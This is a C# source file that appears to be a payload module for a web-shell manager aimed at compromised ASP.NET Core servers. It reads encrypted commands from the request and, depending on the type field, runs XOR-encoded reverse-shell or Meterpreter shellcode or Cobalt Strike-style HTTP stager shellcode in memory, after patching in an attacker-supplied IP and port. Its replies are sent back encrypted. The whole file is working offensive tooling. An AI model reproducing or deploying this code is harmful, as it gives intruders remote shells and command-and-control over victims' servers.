using Microsoft.AspNetCore.Http;
using System.Reflection;
using System.Runtime.InteropServices;
using System.Text;
using System.Security.Cryptography;

public class U
{
    public HttpRequest Request;
    public HttpResponse Response;
    public ISession Session;


    public string content;

    public string sessionId;


    private DefaultHttpContext context;

    private object current;

    public Dictionary<string, Object> globals = new Dictionary<string, Object>();

    public string error_msg;


    public string type;


    public string ip;


    public string port;


    [DllImport("kernel32.dll", SetLastError = true)]
    public static extern IntPtr VirtualAlloc(IntPtr lpAddress, UIntPtr dwSize, uint flAllocationType, uint flProtect);

    [DllImport("kernel32.dll", SetLastError = true)]
    public static extern IntPtr CreateThread(IntPtr lpThreadAttributes, UIntPtr dwStackSize, IntPtr lpStartAddress,
        IntPtr lpParameter, uint dwCreationFlags, out uint lpThreadId);

    [DllImport("kernel32.dll", SetLastError = true)]
    public static extern bool VirtualFree(IntPtr lpAddress, uint dwSize, uint dwFreeType);


    private const uint MEM_COMMIT = 0x1000;
    private const uint MEM_RESERVE = 0x2000;
    private const uint PAGE_EXECUTE_READWRITE = 0x40;
    private const uint THREAD_ALL_ACCESS = 0x1F03FF;


    public override bool Equals(object obj)
    {
        this.init(obj);
        Dictionary<string, string> dictionary = new Dictionary<string, string>();
        try
        {
            if (this.type.Equals("shell"))
            {
                this.shell();
            }
            else if (this.type.Equals("meter"))
            {
                this.meter();
            }
            else if (this.type.Equals("cs"))
            {
                this.cs();
            }

            dictionary.Add("status", "success");
        }
        catch (Exception ex)
        {
            dictionary.Add("status", "fail");
            dictionary.Add("msg", ex.Message);
        }

        this.Response.WriteAsync(Encoding.UTF8.GetString(this.EnjsonAndCrypt(dictionary)));
        return false;
    }


    private void meter()
    {
        byte[] array = new byte[]
        {
            249, 237, 135, 5, 5, 5, 101, 140, 224, 52,
            197, 97, 142, 85, 53, 142, 87, 9, 142, 87,
            17, 142, 119, 45, 10, 178, 79, 35, 52, 250,
            169, 57, 100, 121, 7, 41, 37, 196, 202, 8,
            4, 194, 231, 247, 87, 82, 142, 87, 21, 142,
            79, 57, 142, 73, 20, 125, 230, 77, 4, 212,
            84, 142, 92, 37, 4, 214, 142, 76, 29, 230,
            63, 76, 142, 49, 142, 4, 211, 52, 250, 169,
            196, 202, 8, 4, 194, 61, 229, 112, 243, 6,
            120, 253, 62, 120, 33, 112, 225, 93, 142, 93,
            33, 4, 214, 99, 142, 9, 78, 142, 93, 25,
            4, 214, 142, 1, 142, 4, 213, 140, 65, 33,
            33, 94, 94, 100, 92, 95, 84, 250, 229, 90,
            90, 95, 142, 23, 238, 136, 88, 109, 54, 55,
            5, 5, 109, 114, 118, 55, 90, 81, 109, 73,
            114, 35, 2, 140, 237, 250, 213, 189, 149, 4,
            5, 5, 44, 193, 81, 85, 109, 44, 133, 110,
            5, 250, 208, 111, 15, 109, 119, 119, 119, 119,
            109, 7, 5, 8, 56, 140, 227, 85, 85, 85,
            85, 69, 85, 69, 85, 109, 239, 10, 218, 229,
            250, 208, 146, 111, 21, 83, 82, 109, 156, 160,
            113, 100, 250, 208, 128, 197, 113, 15, 250, 75,
            13, 112, 233, 237, 98, 5, 5, 5, 111, 5,
            111, 1, 83, 82, 109, 7, 220, 205, 90, 250,
            208, 134, 253, 5, 123, 51, 142, 51, 111, 69,
            109, 5, 21, 5, 5, 83, 111, 5, 109, 93,
            161, 86, 224, 250, 208, 150, 86, 111, 5, 83,
            86, 82, 109, 7, 220, 205, 90, 250, 208, 134,
            253, 5, 120, 45, 93, 109, 5, 69, 5, 5,
            111, 5, 85, 109, 14, 42, 10, 53, 250, 208,
            82, 109, 112, 107, 72, 100, 250, 208, 91, 91,
            250, 9, 33, 10, 128, 117, 250, 250, 250, 236,
            158, 250, 250, 250, 4, 198, 44, 195, 112, 196,
            198, 190, 229, 24, 47, 15, 109, 163, 144, 184,
            152, 250, 208, 57, 3, 121, 15, 133, 254, 229,
            112, 0, 190, 66, 22, 119, 106, 111, 5, 86,
            250, 208
        };
        for (int i = 0; i < array.Length; i++)
        {
            array[i] ^= 5;
        }

        array[176] = byte.MaxValue;
        string[] array2 = this.ip.Split(new char[] { '.' });
        for (int i = 0; i < array2.Length; i++)
        {
            array[176 + i] = (byte)int.Parse(array2[i]);
        }

        int num = int.Parse(this.port);
        array[184] = (byte)(num & 255);
        array[183] = (byte)((num & 65280) >> 8);


        uint size = 1024;


        IntPtr allocatedMemory = VirtualAlloc(IntPtr.Zero, (uint)((ulong)((long)array.Length)),
            MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
        if (allocatedMemory == IntPtr.Zero)
        {
            context.Response.Body.WriteAsync(Encoding.ASCII.GetBytes("Memory allocation failed!"));
            return;
        }

        Marshal.Copy(array, 0, allocatedMemory, array.Length);


        uint threadId;
        IntPtr threadHandle = CreateThread(IntPtr.Zero, 0, allocatedMemory, IntPtr.Zero, 0, out threadId);
    }


    private void shell()
    {
        byte[] array = new byte[]
        {
            249, 237, 135, 5, 5, 5, 101, 140, 224, 52,
            197, 97, 142, 85, 53, 142, 87, 9, 142, 87,
            17, 142, 119, 45, 10, 178, 79, 35, 52, 250,
            169, 57, 100, 121, 7, 41, 37, 196, 202, 8,
            4, 194, 231, 247, 87, 82, 142, 87, 21, 142,
            79, 57, 142, 73, 20, 125, 230, 77, 4, 212,
            84, 142, 92, 37, 4, 214, 142, 76, 29, 230,
            63, 76, 142, 49, 142, 4, 211, 52, 250, 169,
            196, 202, 8, 4, 194, 61, 229, 112, 243, 6,
            120, 253, 62, 120, 33, 112, 225, 93, 142, 93,
            33, 4, 214, 99, 142, 9, 78, 142, 93, 25,
            4, 214, 142, 1, 142, 4, 213, 140, 65, 33,
            33, 94, 94, 100, 92, 95, 84, 250, 229, 90,
            90, 95, 142, 23, 238, 136, 88, 109, 54, 55,
            5, 5, 109, 114, 118, 55, 90, 81, 109, 73,
            114, 35, 2, 140, 237, 250, 213, 189, 149, 4,
            5, 5, 44, 193, 81, 85, 109, 44, 133, 110,
            5, 250, 208, 111, 15, 109, 119, 119, 119, 119,
            109, 7, 5, 8, 56, 140, 227, 85, 85, 85,
            85, 69, 85, 69, 85, 109, 239, 10, 218, 229,
            250, 208, 146, 111, 21, 83, 82, 109, 156, 160,
            113, 100, 250, 208, 128, 197, 113, 15, 250, 75,
            13, 112, 233, 237, 98, 5, 5, 5, 111, 5,
            111, 1, 83, 82, 109, 7, 220, 205, 90, 250,
            208, 134, 253, 5, 123, 51, 142, 51, 111, 69,
            109, 5, 21, 5, 5, 83, 111, 5, 109, 93,
            161, 86, 224, 250, 208, 150, 86, 111, 5, 83,
            86, 82, 109, 7, 220, 205, 90, 250, 208, 134,
            253, 5, 120, 45, 93, 109, 5, 69, 5, 5,
            111, 5, 85, 109, 14, 42, 10, 53, 250, 208,
            82, 109, 112, 107, 72, 100, 250, 208, 91, 91,
            250, 9, 33, 10, 128, 117, 250, 250, 250, 236,
            158, 250, 250, 250, 4, 198, 44, 195, 112, 196,
            198, 190, 229, 24, 47, 15, 109, 163, 144, 184,
            152, 250, 208, 57, 3, 121, 15, 133, 254, 229,
            112, 0, 190, 66, 22, 119, 106, 111, 5, 86,
            250, 208
        };
        for (int i = 0; i < array.Length; i++)
        {
            array[i] ^= 5;
        }

        array[176] = byte.MaxValue;
        string[] array2 = this.ip.Split(new char[] { '.' });
        for (int i = 0; i < array2.Length; i++)
        {
            array[176 + i] = (byte)int.Parse(array2[i]);
        }

        int num = int.Parse(this.port);
        array[184] = (byte)(num & 255);
        array[183] = (byte)((num & 65280) >> 8);
        IntPtr intPtr = U.VirtualAlloc(IntPtr.Zero, (UIntPtr)((ulong)((long)array.Length)), U.MEM_COMMIT,
            U.PAGE_EXECUTE_READWRITE);
        Marshal.Copy(array, 0, intPtr, array.Length);
        IntPtr zero = IntPtr.Zero;
        uint threadId;
        IntPtr intPtr2 = U.CreateThread(IntPtr.Zero, UIntPtr.Zero, intPtr, IntPtr.Zero, 0, out threadId);
    }


    public byte[] addByteToArray(byte[] adata, byte[] bdata)
    {
        byte[] array = new byte[adata.Length + bdata.Length];
        adata.CopyTo(array, 0);
        bdata.CopyTo(array, adata.Length);
        return array;
    }


    private void cs()
    {
        int num = 196;
        byte[] array = new byte[]
        {
            252, 232, 137, 0, 0, 0, 96, 137, 229, 49,
            210, 100, 139, 82, 48, 139, 82, 12, 139, 82,
            20, 139, 114, 40, 15, 183, 74, 38, 49, byte.MaxValue,
            49, 192, 172, 60, 97, 124, 2, 44, 32, 193,
            207, 13, 1, 199, 226, 240, 82, 87, 139, 82,
            16, 139, 66, 60, 1, 208, 139, 64, 120, 133,
            192, 116, 74, 1, 208, 80, 139, 72, 24, 139,
            88, 32, 1, 211, 227, 60, 73, 139, 52, 139,
            1, 214, 49, byte.MaxValue, 49, 192, 172, 193, 207, 13,
            1, 199, 56, 224, 117, 244, 3, 125, 248, 59,
            125, 36, 117, 226, 88, 139, 88, 36, 1, 211,
            102, 139, 12, 75, 139, 88, 28, 1, 211, 139,
            4, 139, 1, 208, 137, 68, 36, 36, 91, 91,
            97, 89, 90, 81, byte.MaxValue, 224, 88, 95, 90, 139,
            18, 235, 134, 93, 104, 110, 101, 116, 0, 104,
            119, 105, 110, 105, 84, 104, 76, 119, 38, 7,
            byte.MaxValue, 213, 232, 0, 0, 0, 0, 49, byte.MaxValue, 87,
            87, 87, 87, 87, 104, 58, 86, 121, 167, byte.MaxValue,
            213, 233, 164, 0, 0, 0, 91, 49, 201, 81,
            81, 106, 3, 81, 81, 104, 61, 13, 0, 0,
            83, 80, 104, 87, 137, 159, 198, byte.MaxValue, 213, 80,
            233, 140, 0, 0, 0, 91, 49, 210, 82, 104,
            0, 50, 160, 132, 82, 82, 82, 83, 82, 80,
            104, 235, 85, 46, 59, byte.MaxValue, 213, 137, 198, 131,
            195, 80, 104, 128, 51, 0, 0, 137, 224, 106,
            4, 80, 106, 31, 86, 104, 117, 70, 158, 134,
            byte.MaxValue, 213, 95, 49, byte.MaxValue, 87, 87, 106, byte.MaxValue, 83,
            86, 104, 45, 6, 24, 123, byte.MaxValue, 213, 133, 192,
            15, 132, 202, 1, 0, 0, 49, byte.MaxValue, 133, 246,
            116, 4, 137, 249, 235, 9, 104, 170, 197, 226,
            93, byte.MaxValue, 213, 137, 193, 104, 69, 33, 94, 49,
            byte.MaxValue, 213, 49, byte.MaxValue, 87, 106, 7, 81, 86, 80,
            104, 183, 87, 224, 11, byte.MaxValue, 213, 191, 0, 47,
            0, 0, 57, 199, 117, 7, 88, 80, 233, 123,
            byte.MaxValue, byte.MaxValue, byte.MaxValue, 49, byte.MaxValue, 233, 145, 1, 0, 0,
            233, 201, 1, 0, 0, 232, 111, byte.MaxValue, byte.MaxValue, byte.MaxValue,
            47, 89, 110, 78, 71, 0, 104, 101, 108, 108,
            111, 0, 104, 101, 108, 108, 111, 0, 104, 101,
            108, 108, 111, 0, 104, 101, 108, 108, 111, 0,
            104, 101, 108, 108, 111, 0, 104, 101, 108, 108,
            111, 0, 104, 101, 108, 108, 111, 0, 104, 101,
            108, 108, 111, 0, 104, 101, 108, 108, 111, 0,
            104, 101, 108, 108, 111, 0, 104, 101, 108, 108,
            111, 0, 104, 101, 108, 108, 111, 0, 104, 0,
            85, 115, 101, 114, 45, 65, 103, 101, 110, 116,
            58, 32, 77, 111, 122, 105, 108, 108, 97, 47,
            52, 46, 48, 32, 40, 99, 111, 109, 112, 97,
            116, 105, 98, 108, 101, 59, 32, 77, 83, 73,
            69, 32, 56, 46, 48, 59, 32, 87, 105, 110,
            100, 111, 119, 115, 32, 78, 84, 32, 53, 46,
            49, 59, 32, 84, 114, 105, 100, 101, 110, 116,
            47, 52, 46, 48, 59, 32, 46, 78, 69, 84,
            32, 67, 76, 82, 32, 49, 46, 49, 46, 52,
            51, 50, 50, 59, 32, 66, 79, 73, 69, 56,
            59, 69, 78, 85, 83, 41, 13, 10, 0, 104,
            101, 108, 108, 111, 0, 104, 101, 108, 108, 111,
            0, 104, 101, 108, 108, 111, 0, 104, 101, 108,
            108, 111, 0, 104, 101, 108, 108, 111, 0, 104,
            101, 108, 108, 111, 0, 104, 101, 108, 108, 111,
            0, 104, 101, 108, 108, 111, 0, 104, 101, 108,
            108, 111, 0, 104, 101, 108, 108, 111, 0, 104,
            101, 108, 108, 111, 0, 104, 101, 108, 108, 111,
            0, 104, 101, 108, 108, 111, 0, 104, 101, 108,
            108, 111, 0, 104, 101, 108, 108, 111, 0, 104,
            101, 108, 108, 111, 0, 104, 101, 108, 108, 111,
            0, 104, 101, 108, 108, 111, 0, 104, 101, 108,
            108, 111, 0, 104, 101, 108, 108, 111, 0, 104,
            101, 108, 108, 111, 0, 104, 101, 108, 108, 111,
            0, 104, 101, 108, 108, 111, 0, 104, 101, 108,
            108, 111, 0, 104, 101, 108, 108, 111, 0, 104,
            101, 108, 108, 111, 0, 104, 101, 108, 108, 111,
            0, 104, 101, 108, 108, 111, 0, 104, 101, 108,
            108, 111, 0, 104, 101, 108, 108, 111, 0, 104,
            101, 108, 108, 111, 0, 104, 101, 108, 108, 111,
            0, 104, 101, 0, 104, 240, 181, 162, 86, byte.MaxValue,
            213, 106, 64, 104, 0, 16, 0, 0, 104, 0,
            0, 64, 0, 87, 104, 88, 164, 83, 229, byte.MaxValue,
            213, 147, 185, 0, 0, 0, 0, 1, 217, 81,
            83, 137, 231, 87, 104, 0, 32, 0, 0, 83,
            86, 104, 18, 150, 137, 226, byte.MaxValue, 213, 133, 192,
            116, 198, 139, 7, 1, 195, 133, 192, 117, 229,
            88, 195, 232, 137, 253, byte.MaxValue, byte.MaxValue
        };
        if (IntPtr.Size == 8)
        {
            num = 274;
            array = new byte[]
            {
                252, 72, 131, 228, 240, 232, 200, 0, 0, 0,
                65, 81, 65, 80, 82, 81, 86, 72, 49, 210,
                101, 72, 139, 82, 96, 72, 139, 82, 24, 72,
                139, 82, 32, 72, 139, 114, 80, 72, 15, 183,
                74, 74, 77, 49, 201, 72, 49, 192, 172, 60,
                97, 124, 2, 44, 32, 65, 193, 201, 13, 65,
                1, 193, 226, 237, 82, 65, 81, 72, 139, 82,
                32, 139, 66, 60, 72, 1, 208, 102, 129, 120,
                24, 11, 2, 117, 114, 139, 128, 136, 0, 0,
                0, 72, 133, 192, 116, 103, 72, 1, 208, 80,
                139, 72, 24, 68, 139, 64, 32, 73, 1, 208,
                227, 86, 72, byte.MaxValue, 201, 65, 139, 52, 136, 72,
                1, 214, 77, 49, 201, 72, 49, 192, 172, 65,
                193, 201, 13, 65, 1, 193, 56, 224, 117, 241,
                76, 3, 76, 36, 8, 69, 57, 209, 117, 216,
                88, 68, 139, 64, 36, 73, 1, 208, 102, 65,
                139, 12, 72, 68, 139, 64, 28, 73, 1, 208,
                65, 139, 4, 136, 72, 1, 208, 65, 88, 65,
                88, 94, 89, 90, 65, 88, 65, 89, 65, 90,
                72, 131, 236, 32, 65, 82, byte.MaxValue, 224, 88, 65,
                89, 90, 72, 139, 18, 233, 79, byte.MaxValue, byte.MaxValue, byte.MaxValue,
                93, 106, 0, 73, 190, 119, 105, 110, 105, 110,
                101, 116, 0, 65, 86, 73, 137, 230, 76, 137,
                241, 65, 186, 76, 119, 38, 7, byte.MaxValue, 213, 72,
                49, 201, 72, 49, 210, 77, 49, 192, 77, 49,
                201, 65, 80, 65, 80, 65, 186, 58, 86, 121,
                167, byte.MaxValue, 213, 233, 147, 0, 0, 0, 90, 72,
                137, 193, 65, 184, 61, 13, 0, 0, 77, 49,
                201, 65, 81, 65, 81, 106, 3, 65, 81, 65,
                186, 87, 137, 159, 198, byte.MaxValue, 213, 235, 121, 91,
                72, 137, 193, 72, 49, 210, 73, 137, 216, 77,
                49, 201, 82, 104, 0, 50, 160, 132, 82, 82,
                65, 186, 235, 85, 46, 59, byte.MaxValue, 213, 72, 137,
                198, 72, 131, 195, 80, 106, 10, 95, 72, 137,
                241, 186, 31, 0, 0, 0, 106, 0, 104, 128,
                51, 0, 0, 73, 137, 224, 65, 185, 4, 0,
                0, 0, 65, 186, 117, 70, 158, 134, byte.MaxValue, 213,
                72, 137, 241, 72, 137, 218, 73, 199, 192, byte.MaxValue,
                byte.MaxValue, byte.MaxValue, byte.MaxValue, 77, 49, 201, 82, 82, 65, 186,
                45, 6, 24, 123, byte.MaxValue, 213, 133, 192, 15, 133,
                157, 1, 0, 0, 72, byte.MaxValue, 207, 15, 132, 140,
                1, 0, 0, 235, 179, 233, 228, 1, 0, 0,
                232, 130, byte.MaxValue, byte.MaxValue, byte.MaxValue, 47, 70, 85, 88, 106,
                0, 104, 101, 108, 108, 111, 0, 104, 101, 108,
                108, 111, 0, 104, 101, 108, 108, 111, 0, 104,
                101, 108, 108, 111, 0, 104, 101, 108, 108, 111,
                0, 104, 101, 108, 108, 111, 0, 104, 101, 108,
                108, 111, 0, 104, 101, 108, 108, 111, 0, 104,
                101, 108, 108, 111, 0, 104, 101, 108, 108, 111,
                0, 104, 101, 108, 108, 111, 0, 104, 101, 108,
                108, 111, 0, 104, 0, 85, 115, 101, 114, 45,
                65, 103, 101, 110, 116, 58, 32, 77, 111, 122,
                105, 108, 108, 97, 47, 53, 46, 48, 32, 40,
                99, 111, 109, 112, 97, 116, 105, 98, 108, 101,
                59, 32, 77, 83, 73, 69, 32, 57, 46, 48,
                59, 32, 87, 105, 110, 100, 111, 119, 115, 32,
                78, 84, 32, 54, 46, 49, 59, 32, 84, 114,
                105, 100, 101, 110, 116, 47, 53, 46, 48, 41,
                13, 10, 0, 104, 101, 108, 108, 111, 0, 104,
                101, 108, 108, 111, 0, 104, 101, 108, 108, 111,
                0, 104, 101, 108, 108, 111, 0, 104, 101, 108,
                108, 111, 0, 104, 101, 108, 108, 111, 0, 104,
                101, 108, 108, 111, 0, 104, 101, 108, 108, 111,
                0, 104, 101, 108, 108, 111, 0, 104, 101, 108,
                108, 111, 0, 104, 101, 108, 108, 111, 0, 104,
                101, 108, 108, 111, 0, 104, 101, 108, 108, 111,
                0, 104, 101, 108, 108, 111, 0, 104, 101, 108,
                108, 111, 0, 104, 101, 108, 108, 111, 0, 104,
                101, 108, 108, 111, 0, 104, 101, 108, 108, 111,
                0, 104, 101, 108, 108, 111, 0, 104, 101, 108,
                108, 111, 0, 104, 101, 108, 108, 111, 0, 104,
                101, 108, 108, 111, 0, 104, 101, 108, 108, 111,
                0, 104, 101, 108, 108, 111, 0, 104, 101, 108,
                108, 111, 0, 104, 101, 108, 108, 111, 0, 104,
                101, 108, 108, 111, 0, 104, 101, 108, 108, 111,
                0, 104, 101, 108, 108, 111, 0, 104, 101, 108,
                108, 111, 0, 104, 101, 108, 108, 111, 0, 104,
                101, 108, 108, 111, 0, 104, 101, 108, 108, 111,
                0, 104, 101, 108, 108, 111, 0, 104, 101, 108,
                108, 111, 0, 104, 101, 108, 108, 111, 0, 104,
                101, 108, 108, 111, 0, 104, 101, 108, 0, 65,
                190, 240, 181, 162, 86, byte.MaxValue, 213, 72, 49, 201,
                186, 0, 0, 64, 0, 65, 184, 0, 16, 0,
                0, 65, 185, 64, 0, 0, 0, 65, 186, 88,
                164, 83, 229, byte.MaxValue, 213, 72, 147, 83, 83, 72,
                137, 231, 72, 137, 241, 72, 137, 218, 65, 184,
                0, 32, 0, 0, 73, 137, 249, 65, 186, 18,
                150, 137, 226, byte.MaxValue, 213, 72, 131, 196, 32, 133,
                192, 116, 182, 102, 139, 7, 72, 1, 195, 133,
                192, 117, 215, 88, 88, 88, 72, 5, 0, 0,
                0, 0, 80, 195, 232, 127, 253, byte.MaxValue, byte.MaxValue
            };
        }

        int num2 = int.Parse(this.port);
        array[num] = (byte)(num2 & 255);
        array[num + 1] = (byte)((num2 & 65280) >> 8);
        byte[] bytes = Encoding.ASCII.GetBytes(this.ip);
        array = this.addByteToArray(array, bytes);
        byte[] array2 = array;
        byte[] array3 = new byte[5];
        array = this.addByteToArray(array2, array3);
        IntPtr intPtr = U.VirtualAlloc(IntPtr.Zero, (UIntPtr)((ulong)((long)array.Length)), U.MEM_COMMIT,
            U.PAGE_EXECUTE_READWRITE);
        Marshal.Copy(array, 0, intPtr, array.Length);
        IntPtr zero = IntPtr.Zero;
        uint threadId;
        IntPtr intPtr2 = U.CreateThread(IntPtr.Zero, UIntPtr.Zero, intPtr, IntPtr.Zero, 0, out threadId);
    }


    private void sessionSet(string key, object value)
    {
        if (this.Session == null)
        {
            ((Dictionary<string, object>)this.globals[this.sessionId]).Add(key, value);
        }
        else
        {
            ((Dictionary<string, object>)this.globals[this.Session.Id]).Add(key, value);
        }
    }


    private object sessionGet(string key)
    {
        object obj;
        if (this.Session == null)
        {
            obj = ((Dictionary<string, object>)this.globals[this.sessionId])[key];
        }
        else
        {
            obj = ((Dictionary<string, object>)this.globals[this.Session.Id])[key];
        }

        return obj;
    }


    private void sessionRemove(string key)
    {
        if (this.Session == null)
        {
            ((Dictionary<string, object>)this.globals[this.sessionId]).Remove(key);
        }
        else
        {
            ((Dictionary<string, object>)this.globals[this.Session.Id]).Remove(key);
        }
    }

    private byte[] EnjsonAndCrypt(Dictionary<string, string> result)
    {
        byte[] bytes = Encoding.UTF8.GetBytes(this.Dict2Json(result));
        return this.Encrypt(bytes);
    }

    private string Dict2Json(Dictionary<string, string> dict)
    {
        StringBuilder stringBuilder = new StringBuilder();
        stringBuilder.Append("{");
        foreach (string text in dict.Keys)
        {
            stringBuilder.Append("\"" + text + "\":\"");
            stringBuilder.Append(dict[text] + "\",");
        }

        if (stringBuilder.ToString().EndsWith(","))
        {
            stringBuilder.Remove(stringBuilder.Length - 1, 1);
        }

        stringBuilder.Append("},");
        stringBuilder.Remove(stringBuilder.Length - 1, 1);
        return stringBuilder.ToString();
    }

    private void global()
    {
        Assembly[] assemblies = AppDomain.CurrentDomain.GetAssemblies();


        string targetAssemblyFullName = "Echo, Version=0.0.0.0, Culture=neutral, PublicKeyToken=null";
        var targetAssembly =
            assemblies.FirstOrDefault(assembly => assembly.GetName().FullName.Equals(targetAssemblyFullName));

        if (targetAssembly != null)
        {
            string targetTypeName = "U";
            Type targetType = targetAssembly.GetType(targetTypeName);

            if (targetType != null)
            {
                object instance = Activator.CreateInstance(targetType);
                FieldInfo instancesField =
                    instance.GetType().GetField("globals", BindingFlags.Static | BindingFlags.Public);
                globals = instancesField.GetValue(null) as Dictionary<string, object>;
            }
        }
    }

    private void init(object obj)
    {
        /*
         * .net core中重构体系，所以HttpContext.Current不存在类似的
         */
        global();
        this.current = obj;
        this.fillRequestHandler(obj);
        this.fillParams();
        this.fillSessionHandler();
    }


    private void fillRequestHandler(object obj)
    {
        this.context = (DefaultHttpContext)obj;
        this.Response = this.context.Response;
        this.Request = this.context.Request;
        this.Response.ContentType = "charset=utf-8";
    }

    private void fillSessionHandler()
    {
        try
        {
            this.Session = ((HttpContext)this.context).Session;

            this.Session.Set("test", Encoding.UTF8.GetBytes("test"));

            if (!globals.ContainsKey(this.Session.Id))
            {
                if (globals != null)
                {
                    globals[this.Session.Id] = new Dictionary<string, object>();
                }
            }
        }
        catch (Exception ex)
        {
            if (this.sessionId != null)
            {
                if (!globals.ContainsKey(this.sessionId))
                {
                    if (globals != null)
                    {
                        globals[this.sessionId] = new Dictionary<string, object>();
                    }
                }
            }
            else
            {
                error_msg = ex.Message;
            }
        }
    }

    private void fillParams()
    {
        using (var memoryStream = new MemoryStream())
        {
            context.Request.Body.Seek(0, SeekOrigin.Begin);
            context.Request.Body.CopyTo(memoryStream);


            memoryStream.Seek(0, SeekOrigin.Begin);


            byte[] array = memoryStream.ToArray();


            array = Decrypt(array);


            Dictionary<string, string> extraData = getExtraData(array);


            if (extraData != null)
            {
                foreach (var key in extraData.Keys)
                {
                    var field = this.GetType().GetField(key);
                    if (field != null)
                    {
                        field.SetValue(this, extraData[key]);
                    }
                }
            }
        }
    }

    private byte[] Encrypt(byte[] data)
    {
        var EncryptFunc = ((DefaultHttpContext)current).Items["EncryptFunc"];
        MethodInfo method = (MethodInfo)EncryptFunc.GetType().GetProperty("Method").GetValue(EncryptFunc);


        byte[] array;
        if (method == null)
        {
            byte[] bytes = Encoding.Default.GetBytes(this.Session.Keys.ToArray().ToString());
            array = new RijndaelManaged().CreateEncryptor(bytes, bytes).TransformFinalBlock(data, 0, data.Length);
        }
        else
        {
            array = (byte[])method.Invoke(null, new object[] { data });
        }

        return array;
    }

    private byte[] Decrypt(byte[] data)
    {
        var DecryptFunc = ((DefaultHttpContext)current).Items["DecryptFunc"];
        MethodInfo method = (MethodInfo)DecryptFunc.GetType().GetProperty("Method").GetValue(DecryptFunc);

        byte[] result;
        if (method == null)
        {
            byte[] bytes = Encoding.Default.GetBytes(this.Session.Keys.ToArray().ToString());
            using (Aes aesAlg = Aes.Create())
            {
                aesAlg.Key = bytes;
                aesAlg.IV = bytes;

                ICryptoTransform decryptor = aesAlg.CreateDecryptor(aesAlg.Key, aesAlg.IV);
                result = decryptor.TransformFinalBlock(data, 0, data.Length);
            }
        }
        else
        {
            result = (byte[])method.Invoke(null, new object[] { data });
        }

        return result;
    }

    private Dictionary<string, string> getExtraData(byte[] fullData)
    {
        this.context.Request.Body.Seek(0, SeekOrigin.Begin);
        int num = this.IndexOf(fullData, new byte[]
        {
            126,
            126,
            126,
            126,
            126,
            126
        });
        byte[] bytes = new List<byte>(fullData).GetRange(num + 6, fullData.Length - num - 6).ToArray();
        string @string = Encoding.Default.GetString(bytes);
        Dictionary<string, string> dictionary = new Dictionary<string, string>();
        string[] array = @string.Split(new char[]
        {
            ','
        });
        foreach (string text in array)
        {
            string[] array3 = text.Split(new char[]
            {
                ':'
            });
            if (array3.Length == 2)
            {
                string key = array3[0];
                string string2 = Encoding.UTF8.GetString(Convert.FromBase64String(array3[1]));
                dictionary.Add(key, string2);
            }
        }

        return dictionary;
    }


    internal int IndexOf(byte[] srcBytes, byte[] searchBytes)
    {
        int num = 0;
        int result;
        if (srcBytes == null)
        {
            result = -1;
        }
        else if (searchBytes == null)
        {
            result = -1;
        }
        else if (srcBytes.Length == 0)
        {
            result = -1;
        }
        else if (searchBytes.Length == 0)
        {
            result = -1;
        }
        else if (srcBytes.Length < searchBytes.Length)
        {
            result = -1;
        }
        else
        {
            for (int i = 0; i < srcBytes.Length - searchBytes.Length; i++)
            {
                if (srcBytes[i] == searchBytes[0])
                {
                    if (searchBytes.Length == 1)
                    {
                        return i;
                    }

                    bool flag = true;
                    for (int j = 1; j < searchBytes.Length; j++)
                    {
                        if (srcBytes[i + j] != searchBytes[j])
                        {
                            flag = false;
                            break;
                        }
                    }

                    if (flag)
                    {
                        num++;
                        if (num == 2)
                        {
                            return i;
                        }
                    }
                }
            }

            result = -1;
        }

        return result;
    }

    private void fillRequest(object obj)
    {
        this.Response = this.context.Response;
        this.Request = this.context.Request;
        this.Response.ContentType = "charset=utf-8";
    }

    private void fillSession()
    {
        try
        {
            this.Session = this.context.Session;
        }
        catch (Exception)
        {
            if (!context.Items.ContainsKey(this.context.Session.Id) ||
                this.context.Items[this.context.Session.Id] == null)
            {
                this.context.Items[this.context.Session.Id] = new Dictionary<string, object>();
            }
        }
    }
}